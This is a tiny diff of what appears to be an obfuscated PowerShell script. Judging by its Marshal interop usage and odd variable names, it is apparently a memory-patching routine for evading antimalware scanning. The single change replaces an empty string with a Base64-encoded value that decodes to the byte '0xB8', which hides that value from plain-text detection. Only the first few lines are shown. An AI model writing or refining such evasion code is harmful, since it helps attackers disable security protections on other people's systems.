@@ -1,4 +1,4 @@
-$vxck = ""
+$vxck = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("MAB4AEIAOAA="))
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
